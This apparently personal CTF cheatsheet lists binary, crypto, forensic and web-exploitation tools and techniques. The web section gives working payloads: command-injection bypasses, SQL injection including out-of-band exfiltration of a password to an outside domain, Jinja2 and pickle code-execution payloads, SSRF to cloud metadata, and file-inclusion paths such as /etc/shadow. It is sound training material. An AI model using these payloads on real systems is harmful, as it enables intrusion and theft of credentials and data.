# Tool
This is a cheatsheet for different types of CTF challenges.


## Binary

### Tool
- Command
  | Cmd                     | Comment        |
  |:------------------------|:---------------|
  | `$ readelf -S <binary>` | section header |
  | `$ objdump -R <binary>` | got table      |
  | `$ objdump -d <binary>` | plt table      |
  | `$ c++filt`             |                |
  | `$ hexer`               |                |
  | `$ hexcurse`            |                |
- Inspection
  - PE Viewer
    - reshacker
    - CFF Explorer (ExplorerSuit)
    - PE Detective (ExplorerSuit)
    - Signature Explorer (ExplorerSuit)
    - PE-bear
    - PEview
    - 010 editor
  - Packer Detector
    - PEiD
    - DIE (detect it easy)
      * identify shell and other info
  - Decompiler
    - jad
    - uncompyle6
    - dnSpy
    - Telerik/JustAssembly
  - segment register / index in descripter table
- Debugger
  - IDA pro
    | Key                                                  | Comment                |
    |:-----------------------------------------------------|:-----------------------|
    | `<S-F1>`                                             | set variable structure |
    | `<S-F12>`                                            | string list            |
    | `r` / `h`                                            | encode                 |
    | `x`                                                  | xrefs                  |
    | `y`                                                  | type declaration       |
    | `<C-f>`                                              | search                 |
    | `<R>` > reset pointer type > create  new struct type |                        |
  - Ghidra
  - Windbg preview
  - x64dbg
    | Key         | Comment      |
    |:------------|:-------------|
    | `<space>`   | modify code  |
    | `<C-p>`     | patch binary |
    | `<R>` > `s` | search       |
  - gdb
    - command
      | Cmd    | Comment |
      |:-------|:--------|
      | watch  |         |
      | rwatch |         |
      | awatch |         |
    - plugins
      - peda
      - gef
      - pwndbg
      - pwngdb
  - CheatEngine72
- Headers
  - mingw-w64
    - `$ sudo apt install mingw-w64`
      > /usr/x86_64-w64-mingw32/include
      > 
      > /usr/i686-w64-mingw32/include
- Payload
  - pwntools
  - one\_gadget
  - angr

### Calling Convention
- cdecl
- stdcall (win32api)

  ```c
  __attribute__((stdcall)) void func(int a, int b, int c) {
    ...
  }
  ```

- fastcall

  ```c
  __attribute__((fastcall)) void func(int a, int b, int c) {
    ...
  }
  ```

- thiscall
  > put `this` in `ecx`
  > 
  > used in class member method

  ```
  class human {
    protected:
    string nation;
    public:
    virtual string getNation() {
      return this->nation;
    }
  };
  ```

  ```
  lea edx,[ebp-0x34]
  ...
  mov ecx,edx
  call eax
  ...
  ```

### PE file format
- Alignment
  - File
    - FileAlignment: 0x200
    - Winchester Disk
  - Process
    - SectionAlignment: 0x1000
    - Page Model
- Layout
  | Layout  |                               |
  |:--------|:------------------------------|
  | Headers | Dos MZ Header                 |
  |         | DOS Stub                      |
  |         | PE Header (IMAGE\_NT\_HEADER) |
  |         | Section Headers               |
  | Null    |                               |
  | .text   |                               |
  | Null    |                               |
  | .data   |                               |
  | Null    |                               |
  | .rsrc   |                               |
  | Null    |                               |


## Crypto
  
### Tool
- python
  - pyCryptodome
  - Crypto.Util.number
    | Function | Comment         |
    |:---------|:----------------|
    | inverse  | modulus inverse |
- Sage
  - [sagemath](https://sagecell.sagemath.org/)
  - [CoCalc](https://cocalc.com/)
  - `apt install sagemath`
- hashcat

### Cryptanalysis
- Kerckhoff's Principle
- Classical Cryptanalysis
  - Mathmatical Analysis
  - Brute-Force Attacks
    - Substitution Cipher
      > Caesar Cipher

      - Exhaustive Key Search
      - Letter Frequency Analysis
- Implementation Attacks
- Social Engineering

### Symmetric Cipher
- Stream Cipher
  > encrypt bits individually
  > 
  > usually small and fast  
  > 
  > security dependes entirely on key stream (sync, async), which is random and reproducible
  
  - vulnerable to reused key attack
    
    ```
    E(A) = A xor C
    E(B) = B xor C
    E(A) xor E(B) = A xor B
    ```

  - key stream generator
    > the key stream generator works like a Pseudorandom Number Generator (RNG),
    > which generate sequences from initial seed (key) value
    > 
    > ![](<https://latex.codecogs.com/gif.latex?s_0 = seed, s_{i+1} = f(s_i, s_{i-1}, ..., s_{i-t})>)
  
    - Linear Congruential Generator (LCG)
    
      ![](<https://latex.codecogs.com/gif.latex?S_0 = seed, S_{i+1} = AS_i + B\ mod\ m>)  
    
      Assume
      - unknown A, B and S0 as key
      - m = 2^32
      - S1, S2, S3 are known  
    
      Solving  
      - ![](<https://latex.codecogs.com/gif.latex?S_2 = AS_1 + B\ (mod\ m)>)
      - ![](<https://latex.codecogs.com/gif.latex?S_3 = AS_2 + B\ (mod\ m)>)
    
      Answer
      - ![](<https://latex.codecogs.com/gif.latex?A = (S_2 - S_3) \times inverse(S_1 - S_2, m)\ (mod\ m)>)
      - ![](<https://latex.codecogs.com/gif.latex?B = (S_2 - AS_1)\ (mod\ m)>)
    
    - MT19937
      > python's default RNG

      - can be recovered by 32x624 consecutive bits
        - `from randcrack import RandCrack`

    - Lineare Feedback Shift Register (LFSR)

      ![](<https://latex.codecogs.com/gif.latex?S_{i+3} = S_{i+1} \oplus S_{i}>)
      
      - Characteristic Polynomial
        - ![](<https://latex.codecogs.com/gif.latex?P(x) = x^m + p_{m-1}x^{m-1} + ... + p_1x + p_0>)


- Block Cipher
  > - always encrypt a full block (several bits)
  > - common for internet applications


## Misc

### Tool
- File 
  - binwalk 
  - polyfile
    - `polyfile <file>.pdf --html <file>.html`
- Stego
  - zsteg
  - stegsolve.jar
- Recover
  - unt-wister

### QRcode
- Content
- Encode

### PDF
- decode
  - `qpdf --qdf --object-streams=disable <infile> <outfile>`


## System

### Tool
- Vulnerability Assessment
  - OpenVAS
  - metasploit
  - nmap
- Forensic
  - wireshark
  - autopsy
  - sleuthkit
  - OSForensic
  - regsnap
  - SysinternalsSuit
  - Task Exploere (ExplorerSuit)
  - Driver List (ExplorerSuit)
- Connection
  - telnet
  - nc / ncat
  - socat
  - openssl

### Windows
- `SET __COMPAT_LAYER=RunAsInvoker`


## Web
- [WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/README.md#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E)
- [Web Security CheatSheet](https://blog.p6.is/Web-Security-CheatSheet/)
- [Basic Concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q#/)
- [Awesome Web Security](https://github.com/qazbnm456/awesome-web-security)
- [Basic concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q?type=slide#/)

### Tool
- Temp Server
  - webhook.site
    - unique URL (https / CORS)
    - unique email
  - hookbin.com
  - requestbin.net
- HTTP Request
  - [HTTPie](https://devhints.io/httpie)
    
    ```
    http [--form] POST <url> \
      <header>:<value> \
      <query>==<value> \
      <param>=<string> \
      <param>:=<non-string> \
      <param>:=<json> \
      <file>@<filename>.bin \
      <content>=@<filename>.txt \
      <json>:=@<filename>.json
    ```
- Recon
  - https://crt.sh/
    > Enter an Identity (Domain Name, Organization Name, etc)
  - maltego
  - Burpsuit
  - DNS
    - drill
    - dig
    - nslookup
    - host
    - dnsenum
    - knockpy.py
  - Content
    - dirb
    - DirBuster
    - git-dumper
- Scanner
  - sqlmap
  - xsser
  - ZAP
- Backdoor
  - weevely
  - veil
  - BeEF
- Cracker
  - hydra
    - crunch
  - c-jwt-cracker

### Broken Access Control
- Insecure Direct Object References (IDOR)

### Cache Poisoning

### Command Injection
- Basic
  - ping 127.0.0.1 `; id`
  - ping 127.0.0.1 `| id`
  - ping 127.0.0.1 `&& id`
  - ping '127.0.0.1`'; id #` ' 
  - ping "`$(id)`"
  - cat mewo.txt `$(id)`
  - cat mewo.txt `id`
- Space Bypass
  - cat\</flag
  - {cat,/flag}
  - cat$IFS/flag
  - X=$'cat\x20/flag'&&$X
- Keyword Bypass
  - cat /f'la'g
  - cat /f"la"g
  - cat /f\l\ag
  - cat /f\*
  - cat /f?a?
  - cat ${HOME:0:1}etc${HOME:0:1}passwd

### CSRF
- Cookies Security
  - HttpOnly
  - Secure
  - Domain, Path, SameSite
- HTML Element
  - GET: `<img>`, `<iframe>`, `<form>`
  - POST: `<form>`
- JavaScript
  - GET/POST: `fetch`, `XMLHttpRequest`
- Limitation
  - [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests)
- Mitigation
  - Same-origin policy (SOP)
    - [SameSite cookies explained](https://web.dev/samesite-cookies-explained/)
    - [SameSite Cookie Changes in February 2020: What You Need to Know](https://blog.chromium.org/2020/02/samesite-cookie-changes-in-february.html)
  - CSRF token

### CSS Injection
- expression()
- import URL (CSRF)
  - Referer
  - url(...)
    ```
    body {
      background:
      url(http://example.com/logout);
    }
    ```
  - ...
- CSS Selector
  > Read part of HTML source, like CSRF Token

  ```css
  input[name=csrf][value^="1"]{background:url(http://ip/1)}   X
  input[name=csrf][value^="2"]{background:url(http://ip/2)}   O
  input[name=csrf][value^="2a"]{background:url(http://ip/2a)} X
  input[name=csrf][value^="2e"]{background:url(http://ip/2e)} O
  ...
  <input type="text" name="csrf" avlue="2e58ca...">
  ```

### Deserialization
- ASP.NET Deserialization
  > `ViewState`, `Session`, ... are highly possible to have serialize data
  > encrypted by `machine key` stored in `web.config`.

  - [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- Java
  - Gadgets
    - CommonsCollections
  - Magic Method
    - toString
    - readObject
      ```java
      public class Cat implements Serializable {
        ...
        private vlid readObject(ObjectInputStream in) {
          throws IOException, ClassNotFoundException {
            ...
          }
        }
      }
      ```
    - finalize
    - ...
  - [ysoserial](https://github.com/frohoff/ysoserial)
- PHP
  - Magic Method
    - \_\_destruct()
    - \_\_wakeup()
    - \_\_call()
    - \_\_toString()
  - Phar Deserialization`phar://`
    | Trigger               |           |                |
    |:----------------------|:----------|:---------------|
    | file\_get\_contents() | include() | file\_exists() |
    | getimagesize()        | unlink()  | file()         |
    | fopen()               | is\_dir() | ...            |

    ```php
    <?php
      class Cat {}
      $phar = new Phar("pharfile.phar");
      $phar->startBuffering();
      $phar->setStub("<?php __HALT_COMPILER(); ?>");
      $c = new Cat();
      $phar->setMetadata($c);
      $phar->addFromString("meow.txt", "owo");
      $phar->stopBuffering();
    ?>
    ```
  - [POP Chain](https://github.com/ambionics/phpggc)
- Python
  - Magic Method
    - \_\_reduce\_\_()
  - pickle
    > Stack-based virtual pickle machine

    ```python
    class Exploit(object):
      def __reduce__(self):
        return (os.system, ('id', ))

    serialized = pickle.dumps(Exploit())
    pickle.loads(serialized)
    ```

### DOM Clobbering
- Insert HTML and accessed by JavaScript
  | HTML             | JavaScript | Reference  |
  |:-----------------|:-----------|:-----------|
  | `<a id=a>`       | a          | window.a   |
  | `<img name='a'>` | a          | window.a   |
  |                  |            | document.a |
- Case Study
  - [XSS in GMail’s AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)

### HTTP Desync Attacks

### Local File Inclusion
- RCE
  - access.log / error.log
  - /proc/self/environ `user-agent`
  - phpinfo `tmp file location`
  - /tmp/sess\_{session\_name} `control session content`
  - [session.upload\_progress](https://blog.orange.tw/2018/10/#session-tragedy)
- Trigger `php`
  - require()
  - require\_once()
  - include()
  - include\_once()
- Stream Wrapper
  - `php://filter/<action><filter>/resource=<file>`
    | action    | filter                   |
    |:----------|:-------------------------|
    | \<empty\> | convert.base64-encode    |
    | read=     | string.rot13             |
    | write=    | zlib.deflate             |
    |           | zlib.inflate             |

    ```
    Multiple Filter
    ---------------
    php://filter/read=convert.base64-encode/
                 read=string.rot13/
                 ...
                 resource=phpinfo.php
    ```
  - `php://input`
  - `php://fd`
- Sensitive Files
  - Version Contorl
    - [git-dumper](https://github.com/arthaud/git-dumper)  
  - Unix
    - /etc/hosts
    - /etc/passwd
    - /etc/shadow
    - /proc/net/[tcp,udp]
    - /proc/net/\*
    - /proc/net/arp
    - /proc/net/fib\_trie
    - /proc/net/route
    - /proc/sched\_debug
    - /proc/self/cwd
    - /proc/self/environ
    - /proc/self/exe
    - /proc/self/fd/[num]
  - Web Server
    - /etc/apache2/apache2.conf
    - /etc/apache2/sites-available/000-default.conf
    - /etc/nginx/nginx.conf
    - /etc/php/php.ini
- Path Bypass
  - encoding
    | Encoding                        | Payload   | Decode |
    |:--------------------------------|:----------|:-------|
    | unicode/UTF-8 encoding          | %c1%1c    |        |
    |                                 | %c0%af    |        |
    | unicode/UTF-7 encoding          |           |        |
    | overlong UTF-8 unicode encoding | %c0%2e    | `.`    |
    |                                 | %e0%40%ae | `.`    |
    |                                 | %c0ae     | `.`    |
    |                                 | %c0%af    | `/`    |
    |                                 | %e0%80%af | `/`    |
    |                                 | %c0%2f    | `/`    |
    |                                 | %c0%5c    | `\`    |
    |                                 | %c0%80%5c | `\`    |
    | URL encoding                    | %2e%2e%2f | `../`  |
    |                                 | %2e%2e/   | `../`  |
    |                                 | ..%2f     | `../`  |
    |                                 | %2e%2e%5c | `..\`  |
    | double URL encoding             | %252F     | `/`    |
    |                                 | %255C     | `\`    |
    | 16-bit Unicode encoding         | %u002e    | `.`    |
    |                                 | %u2215    | `/`    |
    |                                 | %u2216    | `\`    |
  - Null bytes
    > bypass file type checking

    - `../../../../../passwd%00.jpg`
  - Mangled paths
    > bypass removing traversal sequences

    - `....//`
    - `...\//`
    - `..//..//..\`        
        
### Pr  ototype Pollution
- `a`.  \_\_proto\_\_ === `A`.prototype
- `und  efined` may be replaced when its prototype has the attribute.
- Trig  ger
  - Set
    - [lodash](https://snyk.io/vuln/SNYK-JS-LODASH-608086) (\_.setWidth, \_.set)
  - Merge / Extend
    - CVE-2019-11358 (jQuery $.extend)
  - Clone
- Prototype Chain
  > When finding a property, JavaScript will go through the Prototype
    Chain until \_\_proto\_\_ is null.

  ```javascript
  > a = []
  > b = []
  > a["__proto__"]["test"] = "testtest" // a["__proto__"] is array
  > b.test
  < "testtest"
  ```
- Case Study
  - [MITRE](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=prototype+pollution)
  - [HackerOne XSS](https://hackerone.com/reports/986386)
  - [CVE-2019-7609](https://slides.com/securitymb/prototype-pollution-in-kibana)

### SQL Injection
- Type
  - Union Based
  - Blind
    - Boolean Based
      ```
      ... id = 1 and length(user()) > 0
      ... id = 1 and length(user()) > 16
      ```
    - Time Based
      ```
      ... id = 1 and IF(ascii(mid(user(),1,1))>0, SLEEP(10), 1)
      ... id = 1 and IF(ascii(mid(user(),1,1))>80, SLEEP(10), 1)
      ```
  - Error
    - ExtractValue(xml, xpath)
      ```
      SELECT ExtractValue(1, concat(0x0a,version()));
      -----------------------------------------------
      XPATH syntax error:'
      8.0.20'
      ```
    - UpdateXML(xml, xpath, new\_xml)
    - exp(x)
    - MultiLineString(LineString)
    - MultiPolygon(Polygon)
  - Out-of-Band
    | DB              | Payload                                                                 | Comment   |
    |:----------------|:------------------------------------------------------------------------|:----------|
    | MySQL + Windows | `load_file(concat("\\\\", password, ".splitline.tw"))`                  | DNS Query |
    | Oracle          | `url_http.request('http://splitline.tw/' \|\| (SELECT user FROM dual))` |           |
- Common Function
  | DB     | Function          |                 |           |            |          |
  |:-------|:------------------|:----------------|:----------|:-----------|:---------|
  | MySQL  | user()            | current\_user() | version() | database() | schema() |
  |        | group\_concat()   |                 |           |            |          |
  | Oracle | url\_http.request |                 |           |            |          |
- Special Table
  | DB          | Payload                                               | Comment   |
  |:------------|:------------------------------------------------------|:----------|
  | MySQL > 5.0 | `SELECT schema_name FROM information_schema.schemata` | Databases |
  |             | `SELECT table_name FROM information_schema.tables`    | Tables    |
  |             | `SELECT column_name FROM information_schema.columns`  | Columns   |

### SSRF
- Scheme
  - [URL schema support](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#bookmark=id.osggnj3pn7l6)
  - HTTP
    - Docker API  
      `http://IP:2375/images/json`
    - Cloud Metadata (GCP)  
      `http://metadata.google.internal/computeMetadata/v1/...`
    - Cloud Metadata (AWS)  
      `http://169.254.169.254/latest/user-data/...`
  - Gopher
    > `gopher://<authority>/<padding><tcp payload>`

    - [Gopher Payload Generator](https://github.com/tarunkant/Gopherus)
    - HTTP GET/POST  
      `gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost:127.0.0.1%0D%0A%0D%0A`
    - MySQL (must without password)  
      [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
    - Redis  
      `gopher://127.0.0.1:6379/_SET%20key%20"value"%0D%0A`
  - Local File
    - `file:///etc/passwd`
    - `file://localhost/etc/passwd`
    - `python` `local_file:///etc/passwd`
    - `java` `file:///var/www/html/`
    - `java` `netdoc:///var/www/html/`
- Authority
  - Representation
    - 127.0.0.1
    - localhost
    - 127.0.1
    - 127.1
    - 0.0.0.0
    - 0
  - IPv6
    - ::1
    - ::127.0.0.1
    - ::ffff:127.0.0.1
    - ::
    - ip6-localhost
  - Positional Notation
    - 2130706443 (dec)
    - 0x7f00000001 (hex)
    - 0x7f.0x0.0x0.0x1
    - 0177000000001 (oct)
    - 0177.0.0.01
  - IDN Encoding
    - http://www.unicode.org/reports/tr46/  
    - https://splitline.github.io/domain-obfuscator/
    - http://ⓀⒶⒾⒷⓇⓄ.ⓉⓌ
  - Domain Name Binding
    - whatever.localtest.me
    - 127.0.0.1.xip.io
  - DNS Rebinding
    - foo.bar.10.0.0.1.xip.io
    - A.54.87.54.87.1time.127.0.0.1.forever.rebind.network
    - 36573657.7f000001.rbndr.us
  - 302 Bypass
    > If the environment does not block http redirect, query your own web server which respond
    >
    > ```php
    > <?php
    >   Header("Locathon: gohper://127.0.0.1:9000/_...")
    > ?>
    > ```
  - URL Parser
    - `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`
      | 1.1.1.1 | 2.2.2.2  | 3.3.3.3 |
      |:-------:|:--------:|:-------:|
      | urllib2 | requests | urllib  |
      | httplib |          |         |
- Case Study
  - [$1.000 SSRF in Slack](https://elbs.medium.com/1-000-ssrf-in-slack-7737935d3884)
  - [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

### SSTI
- Identify Template Engine
  ![](https://miro.medium.com/max/701/1*3hIShkWH_gjOt1b0LNPURQ.png)
- Jinja2
  > Flask default template engine

  - {{ config }}
    - config.SECRET\_KEY
    - config.from\_pyfile(filename)
  - sandbox bypass
    ```python
    # All the below payloads works under python2
    --------------------------------------------

    # Starting from string or list
    {{ "".__class__.__base__ }}

    # File operation
    {{ ''.__class__.__mro__[2].__subclasses__() }}
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt').write('test') }}
    
    # RCE
    {{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read() }}
    > uid=1000(ubuntu)gid=1000(ubuntu)...

    # All the below payloads works under python3
    --------------------------------------------
    {{ ().__class__.__base__.__subclasses__() }}
    {{ ().__class__.__base__.__subclasses__()[132] }} # <class 'os._wrap_close'>
    {{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__ }}
    {{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id') }}

    # Find eval
    {% for c in [].__class__.__base__.__subclasses__(): %}
      {% if c.__name__ == 'catch_warnings': %}
        {% for b in c.__init__.__globals__.values(): %}
          {% if b.__class__ == {}.__class__ %}
            {% if 'eval' in b.keys(): %}
              {{ b['eval']('__import__("os").popen("id").read()') }}
            {% endif %}
          {% endif %}
        {% endif %}
      {% endif %}
    {% endfor %}

    # Import
    {% for x in ().__class__.__base__.__subclasses__() %}
      {% if "warning" in x.__name__ %}
        {{x()._module.__builtins__["__import__"]("os").popen(request.args.payload).read()}}
      {% endif %}
    {% endfor %}
    ```

  - Bypass
    - Use url parameter
      * url/?content=xxx&param1=yyy&param2=zzz

        ```
        xxx = ""[request.args.param1][request.args.param2]
        yyy = __class__
        zzz = __base__
        ```

- Format String Attack

### XS-Leaks
> Browser-based side channel attack

- [xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)

### XSS
- Type
  - Self-XSS
  - Reflected XSS
  - Stored XSS
- Mitigation
  - filter / escape
  - Content Security Policy (CSP)
    > [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

    - script-src
    - Nonce
  - HTTP response header
  - Define trusted resources
- Case Study
  - [XS-Search abusing the Chrome XSS Auditor](https://www.youtube.com/watch?v=HcrQy0C-hEA)

### XXE (XML External Entity Injection)


## Language

### JavaScript
- Reference
  - [wtfjs](https://github.com/denysdovhan/wtfjs)
  - [JavaScript Truth Table](https://thomas-yang.me/projects/oh-my-dear-js/)
  - [你懂 JavaScript 嗎？#8 強制轉型（Coercion）](https://ithelp.ithome.com.tw/articles/10201512)
- Weak Type (comparison `==`)
  - [] == 0
  - [] == "0"
  - ['a', ['b', 'c']] == "a,b,c"
  - "b" + "a" + + "a" + "a" == baNaNa

### PHP
- Reference
  - [php.net](https://www.php.net/)
- Weak Type (comparison `==`)
  - [PHP Truth Table](https://www.php.net/manual/en/types.comparisons.php)
  - `0eXXXX == 0eYYYY`
  - PHP Array
    - $arr[idx] <-> $arr{idx}
    - strcmp([], []) -> NULL
    - md5([]) -> NULL
    - sha1([ ]) -> NULL
    - strlen([ ]) -> NULL
    - file\_put\_contents("info.php", ["<?php ", "phpinfo();"]);
- Keyword Bypass
  - Case Insensitive
    - `<?php SySTeM("ls -al"); ?>`
  - Variable Function
    - `$func="system"; $func("ls -al");`
  - system(id) -> system("id")
  - echo \`id\` -> system("id")

### Python
- Reference
  - [wtfpython](https://github.com/satwikkansal/wtfpython) 
